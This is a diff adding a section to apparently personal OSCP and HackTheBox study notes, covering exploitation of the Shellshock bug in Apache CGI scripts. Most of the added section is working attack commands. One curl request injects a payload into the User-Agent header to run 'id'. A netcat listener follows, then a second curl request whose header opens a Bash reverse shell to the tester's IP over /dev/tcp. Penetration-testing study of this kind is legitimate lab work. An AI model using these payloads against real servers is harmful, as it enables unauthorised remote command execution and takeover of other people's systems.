@@ -53,6 +53,29 @@ See [[OSCP/BOXES/WRITE UPS/Linux/Networked|HTB Networked]].
 
 For a disclosed multi-line backup, save the raw response and decode it in a loop rather than hand-copying the value. See [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]].
 
+## Apache CGI Shellshock header delivery
+
+Send a harmless identity command first, then use a separate listener and a Bash callback only after the proof succeeds.
+
+~~~bash
+# Normal CGI response, saved for comparison.
+curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" | tee "$BoxDir/loot/cgi-baseline.txt"
+
+# Shellshock identity proof through the User-Agent environment header.
+curl -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id' \
+  | tee "$BoxDir/loot/shellshock-id.txt"
+
+# Listener on Kali, started before callback delivery.
+nc -lvnp "$Lport"
+
+# Bash callback through the same CGI header.
+curl --max-time 10 -si "http://$BoxIP:$WebPort/cgi-bin/$Script" \
+  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1"
+~~~
+
+The request can remain open after the callback starts. Treat listener output as the success signal and keep the service port separate from the callback port.
+
 ## Python HTTP Server
 
 ```bash
